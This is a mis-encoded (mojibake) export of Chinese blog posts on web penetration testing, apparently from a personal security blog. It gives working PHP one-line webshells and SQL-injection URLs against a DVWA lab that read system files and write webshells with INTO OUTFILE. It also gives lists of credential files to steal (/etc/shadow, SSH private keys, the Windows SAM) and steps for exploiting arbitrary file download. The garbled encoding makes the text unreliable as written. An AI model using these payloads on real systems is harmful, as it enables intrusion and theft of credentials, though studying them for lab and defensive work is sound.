æ–¹æ³•ï¼ŒæŠŠtxt æ ¼å¼çš„æœ¨é©¬ç”¨move æˆè„šæœ¬æ ¼å¼ã€‚ 5ã€è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ‹¿WebShellåœ¨æœ‰phpä»£ç æ‰§è¡Œæ¼æ´ ä¾‹å¦‚ä¸€äº›æ¡†æ¶æ¼æ´çš„æ—¶å€™ å¯ä»¥é€šè¿‡æ‰§è¡Œä¸€äº›ç³»ç»Ÿå‘½ä»¤è¿›è¡Œæ‹¿WebShell æ‰§è¡Œå‘½ä»¤è¡Œå‘½ä»¤â€œå†™å…¥å†…å®¹åˆ°æ–‡ä»¶â€echo ?php â€œ@eval($_POST[â€˜CEâ€™]);?&gt;â€ &gt; x.php ä¼šè‡ªåŠ¨å°†åˆ›å»ºæœ¨é©¬æ–‡ä»¶å¹¶å°†ä¸€å¥è¯æœ¨é©¬å†™å…¥å…¶ä¸­ï¼Œä½¿ç”¨èœåˆ€è¿æ¥å³å¯ã€‚ 6ã€å¤´åƒä¸Šä¼ æ‹¿WebShellå¤§æ¦‚æ€è·¯ï¼š 1ã€å°†å¤§é©¬æ”¾åœ¨æ–‡ä»¶å¤¹ä¸­ 2ã€å°†æ–‡ä»¶å¤¹å‹ç¼©æˆå‹ç¼©æ–‡ä»¶ï¼ˆzipï¼‰ 3ã€æ­£å¸¸ä¸Šä¼ ä¸€ä¸ªå¤´åƒå¹¶ä¸”æŠ“åŒ… 4ã€å°†æ•°æ®åŒ…ä¸­å›¾ç‰‡å¤´åƒçš„å†…å®¹éƒ¨åˆ†åˆ æ‰ 5ã€é‡æ–°å†™å…¥æ–‡ä»¶å†…å®¹ï¼Œå°†å‹ç¼©æ–‡ä»¶å†™å…¥åˆ°åŸæœ¬å›¾ç‰‡çš„ä½ç½® ä¸Šä¼  ä¹‹åè¿”å›åŒ…ä¸­ä¼šå‘Šè¯‰æˆ‘ä»¬ç»å¯¹è·¯å¾„ å…¶ä»–æ‹¿webshellæ–¹æ³•1ã€PhpMyadminè·å–Webshell 2ã€Tomcatè·å–Webshell 3ã€Weblogicè·å–Webshell 4ã€JBossè·å–Webshell 5.æ›´æ–°é¡µé¢æ‹¿webshell åœ¨ç½‘ç«™æ¨¡æ¿ä¸­çš„404é¡µé¢ä¸­æ’å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œä¹‹åæ‰¾åˆ°è¿™ä¸ªé¡µé¢çš„ç»å¯¹è·¯å¾„ï¼Œè®¿é—®ä¹‹å³å¯æ‹¿Shell 6.ä¸Šä¼ æ’ä»¶æ‹¿webshell å°†æœ¨é©¬æ”¾å…¥zipå‹ç¼©æ–‡ä»¶ä¸­ï¼Œæœ€å¥½æ˜¯ç½‘ç«™æ’ä»¶çš„å‹ç¼©æ–‡ä»¶ï¼Œä¹‹åå†åå°å®‰è£…æ’ä»¶ï¼Œé€‰ä¸­å«æœ‰æœ¨é©¬çš„å‹ç¼©æ–‡ä»¶ï¼Œä¼šè‡ªåŠ¨å°†æ’ä»¶è¿é€šæœ¨é©¬å®‰è£…åœ¨ç½‘ç«™ç›®å½•ä¸‹ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬åªéœ€è¦å¯»æ‰¾åˆ°æœ¨é©¬çš„ç»å¯¹è·¯å¾„å³å¯ ä»Šå¤©ä¸€å¤©æŸ¥äº†å¥½å¤šèµ„æ–™ï¼Œè¿™ç¯‡æ–‡ç« å€Ÿé‰´äº†ä»¥ä¸‹çš„æ–‡ç« ï¼Œæœ‰çš„å¹´ä»£ä¹…è¿œæœ‰çš„åˆšæ›´æ–°ä¸ä¹…ï¼Œä¸å…¶è¯´å€Ÿé‰´ï¼Œå€’ä¸å¦‚è¯´æ˜¯å¯¹è¿™äº›æ–‡ç« çš„ä¸€ä¸ªæ€»ç»“æŠ„å½•ï¼Œåœ¨è¿™é‡Œç”±è¡·æ„Ÿè°¢å„ä½å®‰å…¨å¤§ä½¬çš„æ— ç§åˆ†äº«ï¼ è·å–webshellçš„ä¸€äº›æ€»ç»“ https://www.jianshu.com/p/4d37c160d009 æ‹¿WebShell æ–¹æ³•æ€»ç»“ åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/God_XiangYu/article/details/99644596 http://gstarwd.iteye.com/blog/542376 dedecmsè·å–Webshellæ€»ç»“ http://www.2cto.com/Article/201209/156909.html æµ…è°ˆMySQLå¯¼å‡ºä¸€å¥è¯æœ¨é©¬æ‹¿WebShellçš„æ–¹æ³• å¯¹æœåŠ¡å™¨æ–‡ä»¶è¿›è¡Œè¯»å†™æ“ä½œè·å–webshellä½¿ç”¨into outfileéœ€è¦æœ‰ä»¥ä¸‹æ¡ä»¶ï¼š1231ã€éœ€è¦çŸ¥é“è¿œç¨‹ç›®å½•2ã€éœ€è¦è¿œç¨‹ç›®å½•æœ‰å†™æƒé™3ã€éœ€è¦æ•°æ®åº“å¼€å¯secure_file_privè¿›è¡Œè¯»å†™æ“ä½œ æ•°æ®åº“å¼€å¯secure_file_privinto outfile å¯ä»¥å°†selectçš„ç»“æœå†™å…¥åˆ°æŒ‡å®šç›®å½•çš„txtä¸­ï¼Œä½†éœ€è¦æ•°æ®åº“å¼€å¯secure_file_privï¼Œæ€ä¹ˆå¼€å¯secure_file_privã€‚åœ¨mysqlå®‰è£…ç›®å½•çš„my.iniæ–‡ä»¶ä¸­çš„[mysqld]æ·»åŠ secure_file_priv = â€˜ â€˜ï¼›ç„¶åä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œcmdï¼Œè¿›å…¥mysql/binåœæ­¢mysqlæœåŠ¡net stop mysqlï¼Œé‡æ–°å¯åŠ¨mysqlæœåŠ¡net start mysqlï¼Œç™»å…¥mysql mysql -u root -p enter password: passwordï¼Œæ‰§è¡Œå‘½ä»¤show variables like â€˜%secure%â€™;æŸ¥çœ‹secure_file_privçš„å€¼ï¼ˆè¿™é‡Œå·²ç»å°†secure_file_privçš„å€¼è®¾ä¸ºç©ºï¼Œä½†æ­£å¸¸æ˜¾ç¤ºä¸ºNULLå’Œæ–‡ä»¶è·¯å¾„ï¼‰ï¼Œæ˜¾ç¤ºä»¥ä¸‹ç•Œé¢è¯´æ˜å¯ä»¥å¯¹æœåŠ¡å™¨è¿›è¡Œè¯»å†™æ“ä½œã€‚ http://192.168.1.55:8080/dvwa/vulnerabilities/sqli/?id=1%27%20union%20select%201,load_file(â€˜c å¦‚æœå‡ºç°ä»¥ä¸‹æƒ…å†µ:Query Errot:SELECT CID,TITLE FROM CMS_CONTENTINDEX WHERE TID=25950\\â€™AND 1=2 UNION SELECT LOAD_FILE(â€™C:\\BOOT.INI\\â€™),2æ˜¾ç„¶ï¼Œåœ¨â€œphp.iniâ€é…ç½®æ–‡ä»¶ä¸­magic_quotes_gpcä¸ºonæˆ–åœ¨æ¥å—å‚æ•°çš„æ—¶å€™ç”¨äº†addslashes()æ¶µæ•°ï¼Œå•å¼•å·å°±ä¼šè¢«è‡ªåŠ¨è½¬ä¹‰æˆâ€™ï¼Œå› æ­¤å‡½æ•°æœªèƒ½æ­£ç¡®æ‰§è¡ŒåŠŸèƒ½.è¦ç»•å¼€æ­¤è¿‡æ»¤ï¼Œå¯å°†c:\\boot.iniè½¬æ¢æˆåå…­è¿›åˆ¶ï¼Œè½¬æ¢åä¸º:0x633A5C5C626F6F742E696E69.å†æäº¤å¦‚ä¸‹é“¾æ¥ã€‚http://192.168.1.55:8080/dvwa/vulnerabilities/sqli/?id=1%27%20union%20select%201,load_file(0x633A5C5C626F6F742E696E69)+â€“+&amp;Submit=Submitæˆ–http://192.168.1.55:8080/dvwa/vulnerabilities/sqli/?id=1 and 1=2 union select 1,load_file(0x633A5C5C626F6F742E696E69)+â€“+&amp;Submit=Submit å¦‚æœæƒ³å¯¹æœåŠ¡å™¨è¿›è¡Œå†™æ“ä½œï¼Œç›´æ¥ç”¨ä¸‹ç”¨è¿™æ¡è¯­å¥è¿›è¡Œæ“ä½œï¼šhttp://192.168.1.55:8080/dvwa/vulnerabilities/sqli/?id=1%27%20union%20select%20â€™568311803â€™,2 into outfile â€˜c:/muma.txtâ€™+â€“+&amp;Submit=Submitå†™ä¸ªä¸€å¥è¯è¯•è¯•ï¼šhttp://192.168.1.55:8080/dvwa/vulnerabilities/sqli/?id=1%27%20union%20select%200x3C3F70687020406576616C28245F504F53545B2763686F70706572275D293B3F3E,2 into outfile â€˜c:/muma.txtâ€™+â€“+&amp;Submit=Submitä¸ºä»€ä¹ˆè¦æŠŠä¸€å¥è¯æœ¨é©¬è½¬åŒ–ä¸ºåå…­è¿›åˆ¶ï¼Œå› ä¸ºä¸€å¥è¯æœ¨é©¬é‡Œé¢ä¹Ÿæœ‰å•å¼•å·ï¼Œå†ç”¨å•å¼•å·å¼•èµ·æ¥ä¼šå®¹æ˜“é€ æˆæ··æ·†ã€‚æ‰€ä»¥å¾—å‡ºç»“è®ºï¼šå¦‚æœç”¨ç¼–ç å°±ä¸è¦ç”¨å•å¼•å·ï¼Œç”¨å•å¼•å·å°±ä¸è¦ç”¨ç¼–ç ã€‚ è·å–webè·¯å¾„æ–¹æ³•1%27%20union%20select%201,load_file(0x433A5C5C57494E444F57535C5C73797374656D33325C5C696E65747372765C5C4D657461426173652E786D6C)+--+&amp;Submit&#x3D;Submit &#x2F;&#x2F;è·¯å¾„è®°å¾—è½¬åŒ–ä¸ºåå…­è¿›åˆ¶ å¸¸è§WINDOWSä¸‹é…ç½®æ–‡ä»¶: 123456c:&#x2F;windows&#x2F;php.ini &#x2F;&#x2F;phpé…ç½®ä¿¡æ¯c:&#x2F;windows&#x2F;my.ini &#x2F;&#x2F;MYSQLé…ç½®æ–‡ä»¶ï¼Œè®°å½•ç®¡ç†å‘˜ç™»é™†è¿‡çš„MYSQLç”¨æˆ·åå’Œå¯†ç c:\\mysql\\data\\mysql\\user.MYD &#x2F;&#x2F;å­˜å‚¨äº†mysql.userè¡¨ä¸­çš„æ•°æ®åº“è¿æ¥å¯†ç c:\\windows\\system32\\inetsrv\\MetaBase.xml æŸ¥çœ‹IISçš„è™šæ‹Ÿä¸»æœºé…ç½®d:\\APACHE\\Apache2\\conf\\httpd.confc:\\windows\\repair\\sam &#x2F;&#x2F;å­˜å‚¨äº†WINDOWSç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç  LUNIX/UNIX ä¸‹: 12345678910&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;apache2ç¼ºçœé…ç½®æ–‡ä»¶&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf&#x2F;httpd.conf&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhosts.conf &#x2F;&#x2F;è™šæ‹Ÿç½‘ç«™è®¾ç½®&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F;PHPç›¸å…³è®¾ç½®&#x2F;etc&#x2F;sysconfig&#x2F;iptables &#x2F;&#x2F;ä»ä¸­å¾—åˆ°é˜²ç«å¢™è§„åˆ™ç­–ç•¥&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; apacheé…ç½®æ–‡ä»¶&#x2F;etc&#x2F;rsyncd.conf &#x2F;&#x2F;åŒæ­¥ç¨‹åºé…ç½®æ–‡ä»¶&#x2F;etc&#x2F;my.cnf &#x2F;&#x2F;mysqlçš„é…ç½®æ–‡ä»¶&#x2F;etc&#x2F;redhat-release &#x2F;&#x2F;ç³»ç»Ÿç‰ˆæœ¬&#x2F;usr&#x2F;local&#x2F;resin-3.0.22&#x2F;conf&#x2F;resin.conf é’ˆå¯¹3.0.22çš„RESINé…ç½®æ–‡ä»¶æŸ¥çœ‹ æœåŠ¡å™¨è¯»å–æ–‡ä»¶1union%20select%201,load_file(&#39;c:\\\\boot.ini&#39;)+--+&amp;Submit&#x3D;Submit å†™webshellè·å–æƒé™ 1union select &quot;&lt;?php @eval($_POST[&#39;123&#39;]);?&gt;&quot;,2 into outfile &quot;C:\\\\phpStudy\\\\WWW\\\\123.php&quot;+--+&amp;Submit&#x3D;Submit è·å–webshellåˆ©ç”¨sqlæ³¨å…¥å†™å…¥webshellå‡è®¾æˆ‘ä»¬é€šè¿‡phpinfoæ–‡ä»¶çŸ¥é“äº†ç½‘ç«™çš„ç‰©ç†è·¯å¾„ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬é€šè¿‡ä½¿ç”¨union selectè¯­å¥æ¥å†™å…¥webshell.å†™å…¥éœ€è¦ä½ æœ‰å†™å…¥æƒé™ç­‰ã€‚â€˜ union select 1,â€™â€˜ INTO OUTFILE â€˜/var/www/dvwa/cmd.phpâ€™ +â€“+ //è¿™ç§åæ–œæ‰¾æ‰›/æœ¬åœ°æ²¡æµ‹è¯•ï¼Œå¤§å®¶æµ‹è¯•ä¸€ä¸‹ï¼Œæ¨è§å¤§å®¶ç”¨ä¸¤ä¸ªå\\æ–¹æ³•ï¼Œä¾‹å¦‚:http://192.168.0.105:8080/dvwa/vulnerabilities/sqli/?id=1â€™ union select â€œâ€œ,2 into outfile â€œc:\\php\\htdocs\\dvwa\\123.phpâ€+â€“+&amp;Submit=Submit","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"ä¿¡æ¯æ”¶é›†æ‰€éœ€å·¥å…·åŠç½‘ç«™","slug":"ä¿¡æ¯æ”¶é›†æ‰€éœ€å·¥å…·åŠç½‘ç«™","date":"2019-10-20T15:20:38.000Z","updated":"2020-09-20T08:59:34.111Z","comments":true,"path":"2019/10/20/ä¿¡æ¯æ”¶é›†æ‰€éœ€å·¥å…·åŠç½‘ç«™/","link":"","permalink":"https://zhangyanlady.github.io/2019/10/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%89%80%E9%9C%80%E5%B7%A5%E5%85%B7%E5%8F%8A%E7%BD%91%E7%AB%99/","excerpt":"","text":"ä¸€ã€æ‰«æåŸŸåæ¼æ´ï¼š åŸŸåæ¼æ´æ‰«æå·¥å…·æœ‰AWVSã€APPSCANã€Netsparkã€WebInspectã€Nmapã€Nessusã€å¤©é•œã€æ˜é‰´ã€WVSSã€RSASç­‰ã€‚ äºŒã€å­åŸŸåæ¢æµ‹ï¼š 1ã€dnsåŸŸä¼ é€æ¼æ´ 2ã€æœç´¢å¼•æ“æŸ¥æ‰¾ï¼ˆé€šè¿‡Googleã€bingã€æœç´¢cæ®µï¼‰ 3ã€é€šè¿‡sslè¯ä¹¦æŸ¥è¯¢ç½‘ç«™ï¼šhttps://myssl.com/ssl.html å’Œhttps://www.chinassl.net/ssltools/ssl-checker.html 4ã€å¤‡æ¡ˆå·æŸ¥è¯¢ï¼šï¼Œé€šè¿‡æŸ¥è¯¢ç³»ç»ŸåŸŸåå¤‡æ¡ˆå·ï¼Œå†åæŸ¥å¤‡æ¡ˆå·ç›¸å…³çš„åŸŸåï¼Œæ”¶è·é¢‡ä¸°ã€‚ ç½‘ç«™å¤‡æ¡ˆæŸ¥è¯¢åœ°å€ï¼šhttp://www.beianbeian.com æˆ–http://icp.bugscaner.com/ 5ã€ä½¿ç”¨å·¥å…·æ‰«ææš´åŠ›ç ´è§£ï¼šä½¿ç”¨**k8**å·¥å…· 6**ã€å­—å…¸æšä¸¾æ³•ï¼š**å­—å…¸æšä¸¾æ³•æ˜¯ä¸€ç§ä¼ ç»ŸæŸ¥æ‰¾å­åŸŸåçš„æŠ€æœ¯ï¼Œè¿™ç±»å·¥å…·æœ‰ DNSReconcileã€Layerå­åŸŸåæŒ–æ˜æœºã€DirBusterç­‰ã€‚ 7**ã€**å…¬å¼€DNSæº Rapid7ä¸‹Sonaré¡¹ç›®å‘å¸ƒçš„ï¼šhttps://scans.io/study/sonar.fdns_v2ã€‚ DNSå†å²è§£æï¼š https://dnsdb.io/zh-cn/ 8**ã€ç½‘ç«™æ”¶é›†ï¼š** https://ti.360.cn/#/homepage https://site.ip138.com https://isecurity.huawei.comã€‚ã€ 9ã€jsfinderè·å–äºŒçº§åŸŸåä¿¡æ¯ ä¸‰ã€æ•æ„Ÿä¿¡æ¯æ”¶é›† 1ã€æŸ¥ç›®æ ‡ç½‘ç«™çœŸå®IPï¼Œæœ‰çš„ç½‘ç«™æœ‰CDNï¼Œæ— æ³•çŸ¥é“çœŸå®IPï¼Œæ‰€ä»¥ï¼Œåˆ©ç”¨å¤špingå»åˆ¤æ–­åˆ†æçœŸå®IPã€‚ 2ã€çŸ¥é“çœŸå®IPï¼Œå°±å¯ä»¥ç«¯å£æ‰«æï¼Œçœ‹ä¸€äº›æ•æ„Ÿç«¯å£ã€‚è¦ä¹ˆç«¯å£çˆ†ç ´ï¼Œè¦ä¹ˆå—…æ¢ã€‚è¿›è¡ŒIPåœ°å€ç«¯å£æ‰«æï¼Œå¯¹å“åº”çš„ç«¯å£è¿›è¡Œæ¼æ´æ¢æµ‹ï¼Œæ¯”å¦‚rsync,å¿ƒè„å‡ºè¡€ï¼Œmysql,ftp,sshå¼±å£ä»¤ç­‰ã€‚ æ‰«æç½‘ç«™ç›®å½•ç»“æ„ï¼Œçœ‹çœ‹æ˜¯å¦å¯ä»¥éå†ç›®å½•ï¼Œæˆ–è€…æ•æ„Ÿæ–‡ä»¶æ³„æ¼ï¼Œæ¯”å¦‚phpæ¢é’ˆ google hack è¿›ä¸€æ­¥æ¢æµ‹ç½‘ç«™çš„ä¿¡æ¯ï¼Œåå°ï¼Œæ•æ„Ÿæ–‡ä»¶ 3ã€é€šè¿‡Web**æºä»£ç æ³„éœ²è·å–æ•æ„Ÿä¿¡æ¯** 4ã€é€šè¿‡ç¤¾å·¥åº“ä¿¡æ¯æ³„éœ²è·å–æ•æ„Ÿä¿¡æ¯ 5**ã€é‚®ç®±ä¿¡æ¯æ”¶é›†** 6**ã€å†å²æ¼æ´æ”¶é›†é€šè¿‡ä¸€äº›ç½‘ç«™ï¼›ä¾‹å¦‚å†å²æ¼æ´åº“ï¼š**http://www.anquan.us/ æ¼æ´é“¶è¡Œï¼šhttps://www.bugbank.cn/ 360è¡¥å¤©ï¼šhttps://www.butian.net/ æ•™è‚²è¡Œä¸šæ¼æ´æŠ¥å‘Šå¹³å°ï¼ˆBetaï¼‰https://src.edu-info.edu.cn/login/ æŒ‡çº¹è¯†åˆ«ã€wafã€cdnè¯†åˆ« æŒ‡çº¹è¯†åˆ«ï¼š å·¥å…·è¯†åˆ«ï¼šå¾¡å‰‘WEBæŒ‡çº¹è¯†åˆ«ç³»ç»Ÿã€whatwebã€Wapplyzeræ’ä»¶ç­‰å·¥å…·ã€‚ åœ¨çº¿è¯†çº¹è¯†åˆ«ï¼š http://whatweb.bugscaner.com/look/ http://www.yunsee.cn/finger.html Wafè¯†åˆ«ï¼šä¸‹è½½åå®‰è£…python setup.py install Cdnè¯†åˆ«ç½‘ç«™https://raw.githubusercontent.com/3xp10it/mytools/master/xcdn.pyji å››ã€ä¿¡æ¯æ•´ç†æ¢³ç†èµ„äº§ æœ‰äº†åºå¤§çš„åŸŸåï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¸®åŠ©SRCæ¢³ç†èµ„äº§äº†ã€‚åŸŸåå¯ä»¥å…ˆåˆ¤æ–­å­˜æ´»ï¼Œæ´»ç€çš„ç»§ç»­è¿›è¡Œç¡®å®šIPç¯èŠ‚ã€‚æ ¹æ®IPçš„åˆ†å¸ƒï¼Œç¡®å®šä¼ä¸šçš„å…¬ç½‘ç½‘æ®µ é€šè¿‡ä»¥ä¸‹ç½‘ç«™ SRC**ä¼—æµ‹å¹³å°** å›½é™…æ¼æ´æäº¤å¹³å° https://www.hackerone.com/ BugXåŒºå—é“¾æ¼æ´å¹³å°http://www.bugx.org/ Gsrcç“œå­src https://security.guazi.com/ åŒºå—é“¾å®‰å…¨å“åº”ä¸­å¿ƒ https://dvpnet.io/ CNVDå›½å®¶ä¿¡æ¯å®‰å…¨æ¼æ´å¹³å°http://www.cnvd.org.cn/ æ¼æ´é“¶è¡Œï¼šhttps://www.bugbank.cn/ 360è¡¥å¤©ï¼šhttps://www.butian.net/ æ•™è‚²è¡Œä¸šæ¼æ´æŠ¥å‘Šå¹³å°ï¼ˆBetaï¼‰https://src.edu-info.edu.cn/login/ å›½å†…å¹³å° çŸ¥é“åˆ›å®‡Seebugæ¼æ´å¹³å° https://www.seebug.org/ å·¥æ§ç³»ç»Ÿè¡Œä¸šæ¼æ´å¹³å° http://ivd.winicssec.com/","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"æ–‡ä»¶ä¸Šä¼ ã€ä¸‹è½½","slug":"æ–‡ä»¶ä¸Šä¼ ã€ä¸‹è½½","date":"2019-10-12T14:34:15.000Z","updated":"2020-09-20T08:58:54.931Z","comments":true,"path":"2019/10/12/æ–‡ä»¶ä¸Šä¼ ã€ä¸‹è½½/","link":"","permalink":"https://zhangyanlady.github.io/2019/10/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E3%80%81%E4%B8%8B%E8%BD%BD/","excerpt":"","text":"æ€»ç»“å›¾ æ–‡ä»¶ä¸‹è½½ä¸€ã€æ¼æ´ä»‹ç» ä¸€äº›ç½‘ç«™ç”±äºä¸šåŠ¡éœ€æ±‚ï¼Œå¾€å¾€éœ€è¦æä¾›æ–‡ä»¶æŸ¥çœ‹æˆ–æ–‡ä»¶ä¸‹è½½åŠŸèƒ½ï¼Œä½†è‹¥å¯¹ç”¨æˆ·æŸ¥çœ‹æˆ–ä¸‹è½½çš„æ–‡ä»¶ä¸åšé™åˆ¶ï¼Œåˆ™æ¶æ„ç”¨æˆ·å°±èƒ½å¤ŸæŸ¥çœ‹æˆ–ä¸‹è½½ä»»æ„æ•æ„Ÿæ–‡ä»¶ï¼Œè¿™å°±æ˜¯æ–‡ä»¶æŸ¥çœ‹ä¸ä¸‹è½½æ¼æ´ã€‚ äºŒã€åˆ©ç”¨æ–¹å¼ä¸€èˆ¬é“¾æ¥å½¢å¼:download.php?path=down.php?file=data.php?file= æˆ–è€…åŒ…å«å‚æ•°:&amp;Src=&amp;Inputfile=&amp;Filepath=&amp;Path=&amp;Data= ä¸‰ã€åˆ©ç”¨æ€è·¯:(1)ä¸‹è½½å¸¸è§„çš„é…ç½®æ–‡ä»¶ï¼Œä¾‹å¦‚: ssh,weblogic,ftp,mysqlç­‰ç›¸å…³é…ç½® (2)ä¸‹è½½å„ç§.logæ–‡ä»¶ï¼Œä»ä¸­å¯»æ‰¾ä¸€äº›åå°åœ°å€ï¼Œæ–‡ä»¶ä¸Šä¼ ç‚¹ä¹‹ç±»çš„åœ°æ–¹ï¼Œå¦‚æœè¿æ°”å¥½çš„è¯ä¼šè·å¾—ä¸€äº›å‰è¾ˆä»¬çš„åé—¨ã€‚ (3)ä¸‹è½½webä¸šåŠ¡æ–‡ä»¶è¿›è¡Œç™½ç›’å®¡è®¡ï¼Œåˆ©ç”¨æ¼æ´è¿›ä¸€æ­¥æ”»å…¥æœåŠ¡å™¨ã€‚ å°è¯•è¯»å–/root/.bash_historyçœ‹è‡ªå·±æ˜¯å¦å…·æœ‰rootæƒé™ã€‚å¦‚æœæ²¡æœ‰çš„è¯ã€‚æˆ‘ä»¬åªèƒ½æŒ‰éƒ¨å°±ç­çš„åˆ©ç”¨../æ¥å›è·³è½¬è¯»å–ä¸€äº›.sshä¸‹çš„é…ç½®ä¿¡æ¯æ–‡ä»¶ï¼Œè¯»å–mysqlä¸‹çš„.bash_historyæ–‡ä»¶ã€‚æ¥æŸ¥çœ‹æ˜¯å¦è®°å½•äº†ä¸€äº›å¯ä»¥åˆ©ç”¨çš„ç›¸å…³ä¿¡æ¯ã€‚ç„¶åé€ä¸ªä¸‹è½½æˆ‘ä»¬éœ€è¦å®¡è®¡çš„ä»£ç æ–‡ä»¶ï¼Œä½†æ˜¯ä¸‹è½½çš„æ—¶å€™å˜å¾—å¾ˆç¹çï¼Œæˆ‘ä»¬åªèƒ½å°è¯•å»çŒœè§£ç›®å½•ï¼Œç„¶åä¸‹è½½ä¸€äº›ä¸­é—´ä»¶çš„è®°å½•æ—¥å¿—è¿›è¡Œåˆ†æã€‚ å¦‚æœæˆ‘ä»¬é‡åˆ°çš„æ˜¯java+oracleç¯å¢ƒ å¯ä»¥å…ˆä¸‹è½½/WEB-INF/classes/applicationContext.xml æ–‡ä»¶ï¼Œè¿™é‡Œé¢è®°è½½çš„æ˜¯webæœåŠ¡å™¨çš„ç›¸åº”é…ç½®ï¼Œç„¶åä¸‹è½½/WEB-INF/classes/xxx/xxx/ccc.classå¯¹æ–‡ä»¶è¿›è¡Œåç¼–è¯‘ï¼Œç„¶åæœç´¢æ–‡ä»¶ä¸­çš„uploadå…³é”®å­—çœ‹æ˜¯å¦å­˜åœ¨ä¸€äº›apiæ¥å£ï¼Œå¦‚æœå­˜åœ¨çš„è¯æˆ‘ä»¬å¯ä»¥æœ¬åœ°æ„é€ ä¸Šä¼ é¡µé¢ç”¨apiæ¥å£å°†æˆ‘ä»¬çš„æ–‡ä»¶ä¼ è¾“è¿›æœåŠ¡å™¨ å¦‚æœå…·æœ‰rootæƒé™ åœ¨linuxä¸­æœ‰è¿™æ ·ä¸€ä¸ªå‘½ä»¤ locate æ˜¯ç”¨æ¥æŸ¥æ‰¾æ–‡ä»¶æˆ–ç›®å½•çš„ï¼Œå®ƒä¸æœç´¢å…·ä½“ç›®å½•ï¼Œè€Œæ˜¯æœç´¢ä¸€ä¸ªæ•°æ®åº“/var/lib/mlocate/mlocate.dbã€‚è¿™ä¸ªæ•°æ®åº“ä¸­å«æœ‰æœ¬åœ°æ‰€æœ‰æ–‡ä»¶ä¿¡æ¯ã€‚Linuxç³»ç»Ÿè‡ªåŠ¨åˆ›å»ºè¿™ä¸ªæ•°æ®åº“ï¼Œå¹¶ä¸”æ¯å¤©è‡ªåŠ¨æ›´æ–°ä¸€æ¬¡ã€‚å½“æˆ‘ä»¬ä¸çŸ¥é“è·¯å¾„æ˜¯ä»€ä¹ˆçš„æƒ…å†µä¸‹ï¼Œè¿™ä¸ªå¯ä»¥è¯´æ˜¯ä¸€ä¸ªæ ¸æ­¦å™¨äº†ï¼Œæˆ‘ä»¬åˆ©ç”¨ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´mlocate.dbæ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œåˆ©ç”¨locateå‘½ä»¤å°†æ•°æ®è¾“å‡ºæˆæ–‡ä»¶ï¼Œè¿™é‡Œé¢åŒ…å«äº†å…¨éƒ¨çš„æ–‡ä»¶è·¯å¾„ä¿¡æ¯ã€‚ locate è¯»å–æ–¹æ³•: locate mlocate.db admin //å¯ä»¥å°†mlocate.dbä¸­åŒ…å«adminæ–‡ä»¶åçš„å†…å®¹å…¨éƒ¨è¾“å‡ºæ¥ ï¼ˆ4ï¼‰å¸¸è§åˆ©ç”¨æ–‡ä»¶/root/.ssh/authorized_keys/root/.ssh/id_rsa/root/.ssh/id_ras.keystore/root/.ssh/known_hosts //è®°å½•æ¯ä¸ªè®¿é—®è®¡ç®—æœºç”¨æˆ·çš„å…¬é’¥/etc/passwd/etc/shadow/etc/my.cnf //mysqlé…ç½®æ–‡ä»¶/etc/httpd/conf/httpd.conf //apacheé…ç½®æ–‡ä»¶/root/.bash_history //ç”¨æˆ·å†å²å‘½ä»¤è®°å½•æ–‡ä»¶/root/.mysql_history //mysqlå†å²å‘½ä»¤è®°å½•æ–‡ä»¶/proc/mounts //è®°å½•ç³»ç»ŸæŒ‚è½½è®¾å¤‡/porc/config.gz //å†…æ ¸é…ç½®æ–‡ä»¶/var/lib/mlocate/mlocate.db //å…¨æ–‡ä»¶è·¯å¾„/porc/self/cmdline //å½“å‰è¿›ç¨‹çš„cmdlineå‚æ•° å››ã€æ¼æ´ä¿®å¤ï¼ˆ1ï¼‰è¿‡æ»¤â€.â€ï¼Œä½¿ç”¨æˆ·åœ¨urlä¸­ä¸èƒ½å›æº¯ä¸Šçº§ç›®å½• 